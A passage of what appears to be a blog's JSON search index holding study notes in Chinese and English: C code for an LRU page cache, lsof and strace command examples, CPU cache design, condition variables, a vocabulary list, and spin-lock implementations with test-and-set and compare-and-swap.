hash-\u003earray[i] = NULL; return hash; } // A function to check if there is slot available in memory int AreAllFramesFull( Queue* queue ) { return queue-\u003ecount == queue-\u003enumberOfFrames; } // A utility function to check if queue is empty int isQueueEmpty( Queue* queue ) { return queue-\u003erear == NULL; } // A utility function to delete a frame from queue void deQueue( Queue* queue ) { // 判断队列是不是空 if( isQueueEmpty( queue ) ) return; // If this is the only node in list, then change front // 只有一个 node if (queue-\u003efront == queue-\u003erear) queue-\u003efront = NULL; // Change rear and remove the previous rear QNode* temp = queue-\u003erear; queue-\u003erear = queue-\u003erear-\u003eprev; if (queue-\u003erear) queue-\u003erear-\u003enext = NULL; free( temp ); // decrement the number of full frames by 1 queue-\u003ecount--; } // A function to add a page with given 'pageNumber' to both queue // and hash void Enqueue( Queue* queue, Hash* hash, unsigned pageNumber ) { // If all frames are full, remove the page at the rear if ( AreAllFramesFull ( queue ) ) { // remove page from hash // 移除队尾 QNode hash-\u003earray[ queue-\u003erear-\u003epageNumber ] = NULL; deQueue( queue ); } // Create a new node with given page number, // And add the new node to the front of queue QNode* temp = newQNode( pageNumber ); temp-\u003enext = queue-\u003efront; // If queue is empty, change both front and rear pointers if ( isQueueEmpty( queue ) ) queue-\u003erear = queue-\u003efront = temp; else // Else change the front { // 队首前一个 Node 是 temp queue-\u003efront-\u003eprev = temp; // 队首调整成 temp queue-\u003efront = temp; } // Add page entry to hash also hash-\u003earray[ pageNumber ] = temp; // increment number of full frames queue-\u003ecount++; } // This function is called when a page with given 'pageNumber' is referenced // from cache (or memory). There are two cases: // 1. Frame is not there in memory, we bring it in memory and add to the front // of queue // 2. Frame is there in memory, we move the frame to front of queue void ReferencePage( Queue* queue, Hash* hash, unsigned pageNumber ) { QNode* reqPage = hash-\u003earray[ pageNumber ]; // the page is not in cache, bring it if ( reqPage == NULL ) Enqueue( queue, hash, pageNumber ); // page is there and not at front, change pointer else if (reqPage != queue-\u003efront) { // Unlink rquested page from its current location // in queue. 把这个 Node 从队列上拿下来 reqPage-\u003eprev-\u003enext = reqPage-\u003enext; // 这个 Node 不是最后一个 if (reqPage-\u003enext) // reqPage 的下一个 Node 的 prev 指向 reqPage 的前一个 Node reqPage-\u003enext-\u003eprev = reqPage-\u003eprev; // If the requested page is rear, then change rear // as this node will be moved to front // reqPage 是队尾 if (reqPage == queue-\u003erear) { // 更改队尾 Node queue-\u003erear = reqPage-\u003eprev; // 队尾 Node 没有下一个 Node 了 queue-\u003erear-\u003enext = NULL; } // Put the requested page before current front // reqPage 成为新的队首 Node reqPage-\u003enext = queue-\u003efront; reqPage-\u003eprev = NULL; // Change prev of current front // old 队首的 prev 变成 reqPage reqPage-\u003enext-\u003eprev = reqPage; // Change front to the requested page // 队列的队首是 reqPage queue-\u003efront = reqPage; } } // Driver program to test above functions int main() { // 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5 // Let cache can hold 3 pages Queue* q = createQueue( 3 ); // Let 6 different pages can be requested (pages to be // referenced are numbered from 0 to 5 Hash* hash = createHash( 6 ); // Let us refer pages 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5 ReferencePage( q, hash, 1); ReferencePage( q, hash, 2); ReferencePage( q, hash, 3); ReferencePage( q, hash, 4); ReferencePage( q, hash, 1); ReferencePage( q, hash, 2); ReferencePage( q, hash, 5); ReferencePage( q, hash, 1); ReferencePage( q, hash, 2); ReferencePage( q, hash, 3); ReferencePage( q, hash, 4); ReferencePage( q, hash, 5); // Let us print cache frames after the above referenced pages printf (\"%d \", q-\u003efront-\u003epageNumber); printf (\"%d \", q-\u003efront-\u003enext-\u003epageNumber); printf (\"%d \", q-\u003efront-\u003enext-\u003enext-\u003epageNumber); return 0; } ","references#References":" least recently used cache wiki "},"title":"cache-replacement-policy-lru"},"/blog/clang-structure/":{"data":{"reference#reference":" flexible-array-members-structure-c ","size-of-structure#size of structure":"size of structure"},"title":"clang-structure"},"/blog/cmd-lsof/":{"data":{"":"","lsof--a--c-java--d-3-10#lsof \u003ccode\u003e-a\u003c/code\u003e \u003ccode\u003e-c\u003c/code\u003e java \u003ccode\u003e-d\u003c/code\u003e 3-10":"","lsof--c-java#lsof \u003ccode\u003e-c\u003c/code\u003e \u003ccode\u003e^\u003c/code\u003ejava":"","lsof--c-java-1#lsof \u003ccode\u003e-c\u003c/code\u003e java":"","lsof--d-1#lsof \u003ccode\u003e-d\u003c/code\u003e 1":"","lsof--d-12#lsof \u003ccode\u003e-d\u003c/code\u003e 1,2":"","lsof--iinternet#lsof -i(internet)":"","lsof--p-pid#lsof \u003ccode\u003e-p\u003c/code\u003e pid":"","lsof--t-testsock#lsof \u003ccode\u003e-t\u003c/code\u003e /test.sock":"","lsof--u#lsof \u003ccode\u003e-U\u003c/code\u003e":"通用 ^ 表示非 多个值是 CSV 形式 lsof -i(internet) -i 后可以有空格 [46][protocol][@hostname|hostaddr][:service|port]\n46 specifies the IP version, IPv4 or IPv6 that applies to the following address.‘6’ may be be specified only if the UNIX dialect supports IPv6. If neither ‘4’ nor ‘6’ is specified, the following address applies to all IP versions. protocol is a protocol name - TCP, UDP hostname is an Internet host name. Unless a specific IP version is specified, open network files associated with host names of all versions will be selected. hostaddr is a numeric Internet IPv4 address in dot form; or an IPv6 numeric address in colon form enclosed in brackets, if the UNIX dialect supports IPv6. When an IP version is selected, only its numeric addresses may be specified. service is an /etc/services name - e.g., smtp -or a list of them. port is a port number, or a list of them. lsof -i@10.10.129.99:8080 lsof -i4tcp all ipv4 tcp\nlsof -i4udp all ipv4 udp\nlsof -i4udp@localhost all localhost ipv4 udp\nlsof -i4tcp@10.10.129.99 all 10.10.129.99 tcp\nlsof -i :ssh service ssh\nlsof -i:22 port 22\nlsof -iTCP -sTCP:LISTEN tcp state Listen\nlsof -p pid by pid\nlsof /test.sock lsof -t /test.sock -t(terse) 简要的 get pid\nlsof -c ^java 找到以非 java 命令(command)开始的\nlsof -c java 找到以 java 命令(command)开始的\nlsof +d /dir 该 /dir目录(directory) 下所有\nlsof -d 1 查看 descriptor = 1(标准输出)\nlsof -d 1,2 查看 descriptor = 1,2(标准输出、标准错误)\nlsof -a -c java -d 3-10 条件组合查询 -a(and) -c(command) -d(范围)\nlsof -u root 该 root 下所有 -u(user)\nlsof -U -U(Unix domain socket)","lsof--u-root#lsof \u003ccode\u003e-u\u003c/code\u003e root":"","lsof-d-dir#lsof \u003ccode\u003e+d\u003c/code\u003e /dir":"","lsof-testsock#lsof /test.sock":"","通用#通用":""},"title":"lsof examples"},"/blog/cmd-strace/":{"data":{"references#References":" https://jvns.ca/strace-zine-v2.pdf https://man7.org/linux/man-pages/man1/strace.1.html https://strace.io/ ","strace#strace":"","strace--t--ff--o-maintestlog--f--java-maintest#strace -t -ff -o MainTest.log -f  java MainTest":"","strace--tt--ff--o-maintestlog---f--e-tracefutexwrite--java-maintest#strace -tt -ff -o MainTest.log  -f -e trace=futex,write  java MainTest":"","strace--tt--ff--o-maintestlog---f--e-tracefutexwrite-java-maintest#strace -tt -ff -o MainTest.log  -f -e trace=futex,write java MainTest":"","strace--tt--ff--o-maintestlog---f--e-traceipc--java-maintest#strace -tt -ff -o MainTest.log  -f -e trace=%ipc  java MainTest":"syscall操作系统运行在 kernel space, 拥有整个系统的控制权。 应用程序运行在 user space, 拥有部分权限。 这就是隔离。 To prevent user applications from accessing or modifying critical operating system data. 想让操作系统做些事情怎么办？使用 syscall。\nstracestrace -t -ff -o MainTest.log -f java MainTest -t time -ff follow-fork -o output strace -tt -ff -o MainTest.log -f -e trace=futex,write java MainTest -ff -o 每一个进程的 log 单独写到一个文件\n-rw-rw-r-- 1 yang yang 13468 Apr 20 21:10 MainTest.log.21792 -rw-rw-r-- 1 yang yang 455425 Apr 20 21:10 MainTest.log.21793 -rw-rw-r-- 1 yang yang 1254 Apr 20 21:10 MainTest.log.21794 -rw-rw-r-- 1 yang yang 1361 Apr 20 21:10 MainTest.log.21795 -rw-rw-r-- 1 yang yang 3802 Apr 20 21:10 MainTest.log.21796 -rw-rw-r-- 1 yang yang 1677 Apr 20 21:10 MainTest.log.21797 -rw-rw-r-- 1 yang yang 1705 Apr 20 21:10 MainTest.log.21798 -rw-rw-r-- 1 yang yang 1797 Apr 20 21:10 MainTest.log.21810 -rw-rw-r-- 1 yang yang 6087 Apr 20 21:10 MainTest.log.21811 -rw-rw-r-- 1 yang yang 5541 Apr 20 21:10 MainTest.log.21812 -rw-rw-r-- 1 yang yang 1444 Apr 20 21:10 MainTest.log.21813 -rw-rw-r-- 1 yang yang 33890 Apr 20 21:10 MainTest.log.21814 -rw-rw-r-- 1 yang yang 3996 Apr 20 21:10 MainTest.log.21822 strace -tt -ff -o MainTest.log -f -e trace=futex,write java MainTest -e expr 多个 syscall CSV 形式\nstrace -tt -ff -o MainTest.log -f -e trace=%process java MainTest strace -tt -ff -o MainTest.log -f -e trace=%memory -a java MainTest strace -tt -ff -o MainTest.log -f -e trace=%ipc java MainTest ","strace--tt--ff--o-maintestlog---f--e-tracememory--a-java-maintest#strace -tt -ff -o MainTest.log  -f -e trace=%memory -a java MainTest":"","strace--tt--ff--o-maintestlog---f--e-traceprocess-java-maintest#strace -tt -ff -o MainTest.log  -f -e trace=%process java MainTest":"","syscall#syscall":""},"title":"Cmd Strace"},"/blog/cs-cache/":{"data":{"":" There can be many caches stacked on top of each other. Cache 可以一层一层累积。\nif you miss in one you try in the “lower level cache” Lower level, mean higher number. 在上层的 Cache miss 了，可以在下层的 Cache 去找。依次类推。 There can also be separate caches for data and instructions. Or the cache can be “unified”. 数据和指令的 Cache 可以独立，也可以混合。 to wit: the L1 data cache (d-cache) is the one nearest processor. It corresponds to the “data memory” block in our pipeline diagrams the L1 instruction cache (i-cache) corresponds to the “instruction memory” block in our pipeline diagrams. The L2 sits underneath the L1s. There is often an L3 in modern systems. ","cache-指导思想#cache 指导思想":"局部性原理 temporal locality (时间局部性) Taking advantage of temporal locality:\nbring data into cache whenever its referenced kick out something that hasn’t been used recently spatial locality (空间局部性) Taking advantage of spatial locality: bring in a block of contiguous data (cacheline), not just the requested data.","references#References":" CSE141-Caching-Intro CSE141-Caching CSE141-Caches-Details x86-cache memory-hotplug Cache 是怎样组织和工作的？ cacheinfo-windows intel-cpu-cache caches3-w.pdf wiki-cpu-cache cos316-10-cpu-cache.pdf cos355-Intel-CacheOverview 细说Cache-L1/L2/L3/TLB ","基本问题#基本问题":"怎样找到 cache 中的数据？ 以 32bits 的内存地址，来分析。 (index, offset) 二维坐标来定位一个 byte 的数据。\nindex 定位 cache line，可视为横坐标。 现在可以通过 cache lines = cache size / cache line size 来计算。 index bits = log2(cache lines)\noffset 通过 index 定位到 cache line 后，offset 定位到这个 cache line 的哪一个 byte。 可以视为纵坐标。 offset bits = log2(offset)\ntag 32bits 剩下的部分。\ncache line 应该是多大？ 这其实是分块(block)思想。在利用空间局部性原理。\ncache line size 越大 Exploits more spatial locality. Large cache lines effectively prefetch data that we have not explicitly asked for. 更好地利用空间局部性，提前获取将要访问的数据。 cache line size 越小 Focuses on temporal locality. If there is little spatial locality, large cache lines waste space and bandwidth. 聚焦在时间局部性上，如果没有较好的空间局部性，提前 fetch 了数据，那就浪费了空间和带宽。 #(cache 组织方式)\n实例分析 内存地址 32bits。\n1024 cache lines, 32 Bytes per line. index bits = log2(1024) = 10 offset bits = log2(32) = 5 tags bits = 32 - index - offset = 17\n32KB cache, 64byte lines index bits = log2(32KB / 64Bytes) = 9 offset bits = log2(64) = 6 tags bits = 32 - 9 - 6 = 17\nset 是干什么的？ (set) Associativity means providing more than one place for a cache line to live. One group of lines corresponds to each index.\nit is called a “set” Each line in a set is called a “way” N-Way associativity requires N parallel comparators set = ？ {% asset_img cache-2-ways-cache.svg 2-ways-cache%} cache 哪一种 address？ virtual memory address physical memory address #(缓存类型)"},"title":"cs-cache"},"/blog/cs-condition-variables/":{"data":{"":"","condition-variable-是啥#condition variable 是啥？":"condition variable 是啥？本质上就是一个状态变量 +队列。现实世界中，想要进行下一步的行动，往往需要满足一定的条件(condition)。如十字路口的交通信号灯，信号灯的颜色可以视为状态变量，根据不同的状态，汽车做出不同的选择。一条马路，可以视为队列。红灯时, 汽车就不能通过，排队等候。绿灯时，汽车才可以通过。在计算机中，同样存在这样的问题，如父进程需要等待子进程完成后(条件)，才能继续运行。关键就是围绕状态变量来构建。","reference#Reference":" pthread_cond_wait pthread_cond_signal "},"title":"cs-condition-variables"},"/blog/cs-english-words/":{"data":{"":"","a#a":" association a connection or cooperative link between people or organizations\nallot to assign as a share or portion\nad-hoc An ad hoc activity or organization is done or formed only because a situation has made it necessary and is not planned in advance.Ad hoc is a word that originally comes from Latin and means “for this” or \"for this situation.\" In current American English it is used to describe something that has been formed or used for a special and immediate purpose, without previous planning. 比如 shell 可以直接执行一次性的命令，这就是 ad-hoc，也可以提前写好 bash 脚本可以反复多次执行，这就是提前计划好的。Ad hoc can be used as an adjective or an adverb.\nat the discretion of 由 … 决定，由 … 自行处理。自由裁量权。哈哈哈。比如 object 怎样回收由 gc 具体实现决定。向线程池 submit 的 command 怎么执行, 由具体的 executor 实现来决定。\nASAP as soon as possible 尽快\nauthoritative Someone or something that is authoritative has a lot of knowledge of a particular subject. 比如 authoritative DNS server 是知道相关 domain 的 resource record 的。给你的信息是可以无脑相信的。😄\narchive The archive or archives are a collection of documents and records that contain historical information. You can also use archives to refer to the place where archives are stored. 包含历史信息，如 oracle 的 archived redo log.\nabstraction An abstraction is a general idea rather than one relating to a particular object, person, or situation. 通用的概念，和特定的物体、人、情况无关。\nagent An agent acts on your behalf,\nabundant Something that is abundant is present in large quantities. 大量的\napproximation An approximation is a fact, object, or description which is similar to something else, but which is not exactly the same. 近似\nacquire If you acquire something, you buy or obtain it for yourself, or someone gives it to you.\nawait 及物动词，后跟无生命的事物，消息，等待特定的东西。conditionObject 的 await 等待满足特定的条件 They are awaiting the outcome of the investigation.\nalignment The alignment of something is its position in relation to something else or to its correct position. 相对于某物的位置或者当前的位置","b#b":" bypass bound Bounds are limits which normally restrict what can happen or what people can do.\nbase The base of something is its lowest edge or part. same as bottom\nbacklog A backlog is a number of things which have not yet been done but which need to be done. 积压的工作量\nbackup If you have something such as a second piece of equipment or set of plans as backup, you have arranged for them to be available for use in case the first one does not work. 一个完蛋后，另一个可以无缝顶上。\nbroker A broker is a person whose job is to buy and sell shares, foreign money, or goods for other people. 对于消息中间件就是从 producer 买消息，卖给 consumer。🐶\nbarge If you barge into a place or barge through it, you rush or push into it in a rough and rude way. 横冲直撞，非公平锁，获取时上来就 casState","c#c":" context the circumstances that form the setting for an event, statement, or idea, and in terms of which it can be fully understood and asserted.\ncardinality the number of elements in a given mathematical set 给定集合的元素数量\ncompound Compound is used to indicate that something consists of two or more parts or things.\nconsensus A consensus is general agreement among a group of people. 一群人达成的协议。共识。\ncoalesce If two or more things coalesce, they come together and form a larger group or system. 合并\ncounterbalance To counterbalance something means to balance or correct it with something that has an equal but opposite effect 相等但是有相反作用的\ncompulsory If something is compulsory, you must do it or accept it, because it is the law or because someone in a position of authority says you must.","d#d":" domain an area of territory owned or controlled by a ruler or government.\ndurable Something that is durable is strong and lasts a long time without breaking or becoming weaker\ndiscretion If someone in a position of authority uses their discretion or has the discretion to do something in a particular situation, they have the freedom and authority to decide what to do. 自由裁量权。没有规范的情况下，由有权威的人进行\"圣裁\"。\ndelegation A delegation is a group of people who have been sent somewhere to have talks with other people on behalf of a larger group of people. 代表更大集团的一个和其他人交流的小集团\ndefer If you defer an event or action, you arrange for it to happen at a later date, rather than immediately or at the previously planned time. 延迟到将来发生的事情\ndedicated You use dedicated to describe something that is made, built, or designed for one particular purpose or thing. 专用","e#e":" eligible qualified to participate or be chosen\nexception An exception is a particular thing, person, or situation that is not included in a general statement, judgment, or rule.\nentity An entity is something that exists separately from other things and has a clear identity of its own. 独立有清晰标识的东西\nephemeral If you describe something as ephemeral, you mean that it lasts only for a very short time. 只持续较短时间的东西。短暂的。\nexclusive If two things are mutually exclusive, they are separate and very different from each other, so that it is impossible for them to exist or happen together. 不可共存\nefficiency Efficiency is the quality of being able to do a task successfully, without wasting time or energy. 何谓效率？不浪费时间或能量。\nentry An entry in a diary, account book, computer file, or reference book is a short piece of writing in it.\nevict If someone is evicted from the place where they are living, they are forced to leave it, usually because they have broken a law or contract. 驱逐","f#f":" failover The designed ability of a server, network or other computer system to switch over automatically to a redundant or standby system in order to avoid loss of access in the event of a failure of the primary system.\nfallback Someone’s fallback position is what they will do if their plans do not succeed, or if something unexpected happens.\nfield A field is an area of a computer's memory or a program where data can be entered, edited, or stored.\nfactor out 分解\nfragemented If something fragments or is fragmented, it breaks or separates into small pieces or parts. 碎片化\nflexible Something or someone that is flexible is able to change easily and adapt to different conditions and circumstances as they occur.","g#g":" gateway a gateway converts between protocols","h#h":" handle A handle is the part of an object such as a tool, bag, or cup that you hold in order to be able to pick up and use the object.\nheap A heap of things is a pile of them, especially a pile arranged in a rather untidy way. 不规整放置的东西","i#i":" independent not connected with another or with each other; separate 互不关联，分离的 If one thing or person is independent of another, they are separate and not connected, so the first one is not affected or influenced by the second.\nintegrity The integrity of something such as a group of people or a text is its state of being a united whole. 完整性\ninterpose If you interpose something between two people or things, you place it between them. 将 … 置于两者之间，中间层。\ninherent The inherent qualities of something are the necessary and natural parts of it. 天生就有的。资本一出生就带着…\ni.e. i.e .is used to introduce a word or sentence which makes what you have just said clearer or gives details. 即是,进一步解释清楚\ninterface The interface between two subjects or systems is the area in which they affect each other or have links with each other. 两个之间的东西，那可不就是中间层么？\nimmense If you describe something as immense, you mean that it is extremely large or great.\ninterfere If you say that someone interferes in a situation, you mean they get involved in it although it does not concern them and their involvement is not wanted. 干涉\ninbound An inbound flight is one that is arriving from another place. 入站的。反之 outbound。","j#j":"","k#k":"","l#l":" lifetime A lifetime is the length of time that someone is alive. 某人活着的时间，也就是享年多久。 The lifetime of a particular thing is the period of time that it lasts. 某事物存在的时长。\nleave options open 暂不决定 ","m#m":" majority The majority of people or things in a group is more than half of them. 什么是 majority。超过一半的人/事物才叫 majority。zookeeper cluster 推荐 server 数量奇数。\nmediator a person or an organization that tries to get agreement between people or groups who disagree with each other 多方势力之间的调停者","n#n":"","o#o":" overhead 额外的费用、消耗\non the fly If you do something on the fly, you do it quickly without thinking about it or planning it in advance, especially while something else is happening. 没有提前计划做事情或者不假思索做事情\noverlap If one thing overlaps another, or if you overlap them, a part of the first thing occupies the same area as a part of the other thing. You can also say that two things overlap. 空间上重叠\noutstanding Outstanding issues or problems have not yet been resolved. 还没完成的、还没解决的。若用 tcp 确认机制，就是 unacknowledged 的包。\noffset If one thing is offset by another, the effect of the first thing is reduced by the second, so that any advantage or disadvantage is cancelled out. 抵消 Refers to the distance between a base address (starting memory location) and a specific address","p#p":" precedence the condition of being considered more important than someone or something else; priority in importance, order, or rank. 优先级\nparenthesis 括号\npreemptive serving or intended to preempt or forestall something, especially to prevent attack by disabling the enemy.\npopulate to provide with members 对象填充成员属性\nparameter Parameters are factors or limits which affect the way that something can be done or made.\nproxy A proxy is a person or thing that is acting or being used in the place of someone or something else.\npayload The payload of an aircraft or spacecraft is the amount or weight of things or people that it is carrying.\nproceed If you proceed to do something, you do it, often after doing something else first. 先做完一件事，接着做另一件事。\npending If something is done pending a future event, it is done until that event happens.\npost- Post- is used to form words that indicate that something takes place after a particular date, period, or event.\npre- Pre- is used to form words that indicate that something takes place before a particular date, period, or event.\nper se Per se means ‘by itself’ or ‘in itself’, and is used when you are talking about the qualities of one thing considered on its own, rather than in connection with other things. 本身，本质上\npermissible If something is permissible, it is considered to be acceptable because it does not break any laws or rules. 不违反法律和规则即为允许的\nproxy a proxy emulates a service provided by a server that is not contacted directly by the client itself\nrespectively Respectively means in the same order as the items that you have just mentioned. 和刚刚提到过的保持一致的顺序。相应地\npremise a premise is something that you suppose is true and that you use as a basis for developing an idea. 前提\nprivileged Someone who is privileged has an advantage or opportunity that most other people do not have, often because of their wealth or high social class. 特权\npile A pile of things is a quantity of things that have been put neatly somewhere so that each thing is on top of the one below. 一个摞一个 stack\nportion A portion of something is a part of it.\npossession If you are in possession of something, you have it, because you have obtained it or because it belongs to you. 占有","q#q":"","r#r":" relinquish to stop having sth, especially when this happens unwillingly 抢占式调度，timer 定时中断，time slice 用完，必须让出 CPU。 voluntarily cease to keep or claim; give up. 自愿放弃 to give over possession or control of : YIELD 放弃控制\nreference A reference is something such as a number or a name that tells you where you can obtain the information you want. 能从中获取信息的东西，隔一层。you-\u003ereference-\u003einfo\nroutine A routine is a computer program, or part of a program, that performs a specific function.","s#s":" sparse thinly dispersed or scattered, 稀疏的 Something that is sparse is small in number or amount and spread out over an area.\nslot a long, narrow aperture or slit in a machine for something to be inserted an allotted place in a arrangement or plan such as a broadcasting schedule.(安排或计划中分配的位置)\nsandbox A sandbox is a place on a computer system where an untrusted program can be run without affecting other parts of the system.\nsuspend If you suspend something, you delay it or stop it from happening for a while or until a decision is made about it. 最著名的例子就是进程 suspend，之后 scheduler 再 decide 是不是再次运行。\nshard Shards are pieces of broken glass, pottery, or metal. fragement,piece 一片，想象一下把一整块玻璃打碎，分成多个碎片，scale out..\nstandby A standby is something or someone that is always ready to be used if they are needed.\nsegment A segment of something is one part of it, considered separately from the rest. 整体的一部分，分段，和余下的部分分开的。\nsplit If something splits or if you split it, it is divided into two or more parts.\nsegregate To segregate two groups of people or things means to keep them physically apart from each other.\nsurrogate You use surrogate to describe a person or thing that is given a particular role because the person or thing that should have the role is not available. 代理\nsweep If someone makes a sweep of a place, they search it, usually because they are looking for people who are hiding or for an illegal activity. 搜寻，扫荡 If lights or someone’s eyes sweep an area, they move across the area from side to side. 磁盘的调度算法之 elevator(SCAN/C-SCAN) 从最内部向最外部(反之亦可)的磁道扫描\nscatter If you scatter things over an area, you throw or drop them so that they spread all over the area.","t#t":" ternary\ncomposed of three parts 三元\ntrade-off\nbalance achieved between two desirable but incompatible features; balancing of factors all of which are not attainable at the same time 平衡两个互不兼容的特性，妥协\ntrade off\nIf you trade off one thing against another, you exchange all or part of one thing for another, as part of a negotiation or compromise. 以 … 换取\ntraid / triplet\nticket\na certificate or token showing that a fare or admission fee has been paid 票\ntuple\ncomputing a row of values in a relational database 关系型数据库中的一行就是 tuple\ntransient Transient is used to describe a situation that lasts only a short time or is constantly changing. 持续时间很短或者一直在变化的情况，和 persistent 相反\ntransition Transition is the process in which something changes from one state to another. 一个状态变成另一个状态, 这是什么? 这就是状态机。\ntrap A trap is a device which is placed somewhere or a hole which is dug somewhere in order to catch animals or birds.","u#u":"","v#v":" virtualize To virtualize means to take something of one form and make it appear to be another form. 这不就是 transformer 🤣","w#w":"","x#x":"","y#y":" yield If you yield something that you have control of or responsibility for, you allow someone else to have control or responsibility for it 自愿让出 ","z#z":""},"title":"cs-english-words"},"/blog/cs-lock/":{"data":{"":"","critical-section#critical section":" balance = balance + 1; 在多线程环境下，这段代码执行有问题。如何保证任意时刻，只有一个线程在执行这段代码呢？用 lock，获取这个锁之后，才可以执行这段代码，这段代码执行完毕后，释放这个锁。没有获取锁的线程，无法执行这段代码。也可以认为通过 lock 来监视这段代码任意时刻只能有一个线程执行。不错，monitor 本质上也是一个锁。","lock-是啥#lock 是啥？":"lock 本质上是一个变量。变量本质上是一块内存。归根结底，lock 就是一块内存，用这块内存来保证线程的原子性。锁有两种状态：\n被占用 空闲 ","references#References":" Lock gcc-inline-assembly-howto atomic-exchange compare-and-swap-lock lock cpmxchg xadd system-call-table sched_yield gettid ","spin-lock-的问题#Spin Lock 的问题":"spin forever 线程有优先级的概念。 Thread1(priority1) \u003c Thread(priority2), 在 Thread1 和 Thread2 都是 runnable 情况下，调度器保证先运行 Thread2。 由上图可知，Thread2 可能永远无法获取锁，导致系统挂掉。\nPriority Inversion 有上图可知 Thread2 有可能在 Thread3 之前运行，这不符合线程优先级的要求。 Thread2 和 Thread3 的优先级反转了。","two-phrase-lock#two-phrase-lock":" spin(先旋转一段时间，看能不能获取锁) sleep(先旋转一段时间，不能获取锁，线程进入 sleep 状态，放弃 CPU) ","为啥需要-lock#为啥需要 lock？":" 多处理器的存在 中断的存在 ","如何评估估锁#如何评估估锁":"mutual exclusion 锁，提供互斥功能。\nfairless 是否会有线程饥饿\nperformance ","如何避免-spin#如何避免 spin？":"yield(放弃 CPU) void init() { flag = 0; } void lock() { while (TestAndSet(\u0026flag, 1) == 1) yield(); // give up the CPU, 线程状态由 running-\u003eready } void unlock() { flag = 0; } 当一个线程无法获取锁时，不是 spin，而是 yield(), 线程状态由 running 变为 ready。 这样就节约了时间。但是无法解决饥饿问题。 若一个线程不停的获取锁，进入临界区，释放锁。 其他的尝试获取锁的线程就会不断的 yield。\nUsing Queues: Sleeping Instead Of Spinning Lock With Queues, Test-and-set, Yield, And Wakeup typedef struct __lock_t { int flag; // lock int guard; // spin lock queue_t *q; // 队列,需要锁的线程放在队列里，避免饥饿。 } lock_t; void lock_init(lock_t *m) { m-\u003eflag = 0; m-\u003eguard = 0; queue_init(m-\u003eq); } void lock(lock_t *m) { while (TestAndSet(\u0026m-\u003eguard, 1) == 1) ; //acquire guard lock by spinning if (m-\u003eflag == 0) { m-\u003eflag = 1; // lock is acquired m-\u003eguard = 0; } else { queue_add(m-\u003eq, gettid()); //1 线程 id 放入队列 setpark(); // 将要 park()！！！！ m-\u003eguard = 0; //2 park(); //3 running-\u003esleep，被 unpark() 叫醒，就像在这里返回。先去获取 guard 这个 spin lock。 } } void unlock(lock_t *m) { // 先获取 guard 这个 spin lock while (TestAndSet(\u0026m-\u003eguard, 1) == 1){ ; //acquire guard lock by spinning } if (queue_empty(m-\u003eq)) // 队列为空，没有等待锁的线程 m-\u003eflag = 0; // let go of lock; no one wants it else unpark(queue_remove(m-\u003eq)); //4 hold lock, 叫醒这个 m-\u003eq 线程。 // (for next thread!) m-\u003eguard = 0; } ","构建-lock#构建 Lock":"控制中断 void lock(){ disableInterrupts(); // 关闭中断 } void unlock(){ enableInterrputs(); // 开启中断 } 对于单处理器，可以直接来关闭中断、开启中断的方式来实现线程的原子性。 关闭、开启中断的指令是特权指令。\n优点 实现简单、便于理解。在关闭中断的情况下，可以保证线程的执行不会被打断。\n缺点 需要特权指令。可能被滥用。若一个程序关闭中断后，执行死循环，那么就霸占了 CPU，想要解决这个问题，就只好重启了。 在多核的处理器上，关闭中断没有用。因为其他线程可以在其他处理器上运行，也可以进入临界区。 可能会丢失其他的中断信号。一直在处理这个中断，没空搭理其他的中断请求。 低效。处理中断还是很麻烦的。 失败的尝试，只用 Loads/Stores typedef struct __lock_t{ int flag; // lock 状态 } lock_t; void init(lock_t *mutex){ // 0 -\u003e lock is available // 1 -\u003e held mutex-\u003eflag = 0; } void lock(lock_t *mutex){ while(mutex-\u003eflag == 1){ // 检测锁是否被占用(L1) ; // spin-wait(do noting)(L2) } mutex-\u003eflag = 1; // 获取锁(L3) } void unlock(lock_t *mutex){ mutex-\u003eflag = 0; // 释放锁(U1) } Loads/Stores 分析 上图可见，由于中断的存在，在1.检测锁是否被占用 2.获取锁 这两个步骤之间，可能被打断，这样两个线程都获取了这个锁。这不符合锁的基本功能，没有提供互斥。无法保证临界区，任意时刻只有一个线程在执行。 如果一个线程 T1 已经获取了锁，另外一个线程 T2 在获取锁时，会在 L1 处不停的判断锁的状态，这就是在 L1 处 Spin，这就是所谓的 Spin Lock。 test-and-set(atomic exchange) 构建锁 因为只是简单的 Loads/Stores(Reads/Writes) 不能构建出 Lock。所以引入和支持构建 Lock 的 test-and-set 指令。在 x86 下，指令是 xchg。Exchanges the contents of the destination (first) and source (second) operands. The operands can be two general-purpose registers or a register and a memory location. If a memory operand is referenced, the processor’s locking protocol is automatically implemented for the duration of the exchange operation, regardless of the presence or absence of the LOCK prefix or of the value of the IOPL. 用 xchg 原子交换来实现。\nC 语言表示 test-and-set 语义 int TestAndSet(int *old_ptr, int new) { int old = *old_ptr; // fetch old value at old_ptr, Read *old_ptr = new; // store ’new’ into old_ptr, Write return old; // return the old value } test-and-set 构建锁 typedef struct __lock_t{ int flag; // lock 状态 } lock_t; void init(lock_t *lock){ // 0 -\u003e lock is available // 1 -\u003e held lock-\u003eflag = 0; } void lock(lock_t *lock){ while(TestAndSet(lock-\u003eflag, 1) == 1){ // 检测锁是否被占用,同时将 flag 设置为 1(L1) ; // spin-wait(do noting)(L2) } } void unlock(lock_t *lock){ lock-\u003eflag = 0; // 释放锁(U1) } test-and-set spin-lock 分析 correctness 由上图分析可知，test-and-set 这个 spin lock 提供了 mutual exclusion，这是锁的基本功能。\nfairness spin lock 不是公平的，可能导致线程饥饿。\nperformance 单处理器 对于 spin lock，假定有 N 个线程，其中有一个线程已经持有的这个锁。其余 N - 1 个线程来获取这个锁，当调度器调度一个线程获取锁时，会在时间片(T)内一直死循环判定 TestAndSet 的返回值，直到时间片消耗完，线程切出。会浪费 (N - 1) * T 这么多时间。\n多处理器 由图可知，在多处理器环境中，若 critical section 很短，在 Thread1 释放这个锁后，其余的线程是可以获取这个锁的。耗时并不长。\nCompare-And-Swap(Exchange) 构建锁 C 语言表示 Compare-And-Swap 语义 int CompareAndSwap(int *ptr, int expected, int new) { int original = *ptr; if (original == expected) *ptr = new; return original; } Compare-And-Swap 构建锁 typedef struct __lock_t{ int flag; // lock 状态 } lock_t; void init(lock_t *lock){ // 0 -\u003e lock is available // 1 -\u003e held lock-\u003eflag = 0; } void lock(lock_t *lock){ while(CompareAndSwap(\u0026lock-\u003eflag, 0, 1) == 1){ // 检测锁是否被占用 ; // spin-wait(do noting)(L2) } } void unlock(lock_t *lock){ lock-\u003eflag = 0; // 释放锁(U1) } x86-version of compare-and-swap char compare_and_swap(int *ptr, int old, int new) { unsigned char ret; // Note that sete sets a 